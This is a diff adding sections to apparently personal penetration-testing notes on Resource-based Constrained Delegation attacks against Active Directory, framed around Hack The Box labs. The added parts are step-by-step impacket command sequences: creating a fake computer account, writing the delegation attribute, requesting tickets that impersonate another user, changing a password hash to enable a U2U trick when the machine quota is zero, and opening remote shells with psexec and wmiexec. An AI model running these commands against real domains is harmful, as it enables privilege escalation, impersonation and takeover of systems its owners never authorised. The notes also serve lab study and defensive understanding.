@@ -4,6 +4,31 @@ Resource-based Constrained Delegation was introduced in Windows Server 2012.
 
 > The user sends a Service Ticket (ST) to access the service ("Service A"), and if the service is allowed to delegate to another pre-defined service ("Service B"), then Service A can present to the authentication service the TGS that the user provided and obtain a ST for the user to Service B.  <https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html>
 
+## HTB Method (Linux)
+> Requirements:
+  1. Access to a user or group that has enough privileges to modify the msds-allowedtoactonbehalfofotheridentity. Commonly GenericWrite/All, WriteProperty, or WriteDACL
+  2. Control of another object that has an SPN
+
+1. Add the fake machine
+  ```bash
+  impacket-addcomputer -computer-name 'FakeComputer' -computer-pass <password> -dc-ip <DC IP> <domain>/<controlled username>
+  ```
+2. Add the fake machine account to the target computers trust list. (Possible because we have GenericalAll)
+  ```bash
+  impacket-rbcd -dc-ip <DC IP> -t <Target Computer hostname> -f <fakemachine hostname> <domain>/<controlled username>:<controlled password>
+  ```
+3. Get the Target
+  ```bash
+  impacket-getST -spn <SPN> -impersonate <user to impersonate> -dc-ip <DC IP> <domain>/<fakemachinehostname>:<fakemachinepassword>
+  ```
+4. Export the ticket for use
+  ```bash
+  export KRB5CCNAME=<Ticket.ccache>
+  ```
+5. Test it out 
+  ```bash
+  impacket-psexec -k -no-pass <target computer>
+  ```
 ## HTB Method (Windows)
 > Requirements: 
   1. Access to a user or group that has enough privileges to modify the msds-allowedtoactonbehalfofotheridentity. Commonly GenericWrite/All, WriteProperty, or Write DACL 
@@ -76,6 +101,30 @@ Resource-based Constrained Delegation was introduced in Windows Server 2012.
   Get-DomainComputer DC01 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity -Credential $credentials -Verbose
   ```
 
+## RBCD from Linux when the MachineAccountQuota is Set to 0 
+1. Obtain a TGT Using the NT hash
+  ```bash
+  pypykatz crypto nt '<password of compromised user'
+  ```
+  ```bash
+  impacket-GetTGT <domain>/<username> -hashes :<hash from previous step> -dc-ip <DC IP>
+  ```
+2. Verify the ticket works by obtaining the session key
+  ```bash
+  impacket-describeticket <user.ccache> | grep 'Ticket Session Key'
+  ```
+3. Change the users password to allow the DC to decrypt the ticket
+  ```bash
+  impacket-changepassword <domain>/<username>@<DC IP> -hashes :<hash from previous steps> -newhash <session key hash>
+  ```
+4. Get the Service Ticket
+  ```bash
+  KRB5CCNAME=<user.ccache> impacket-getST -u2u -impersonate <User to impersonate> -spn <SPN> -no-pass <domain>/<controlled username> -dc-ip <DC IP>
+  ```
+5. Access the Machine
+  ```bash
+  KRB5CCNAME=<impersonated user.ccache> wmiexec.py <Compromised machine(DC)> -k -no-pass
+  ```
 ## Swisskey Method 
 
 1. Import **Powermad** and **Powerview**
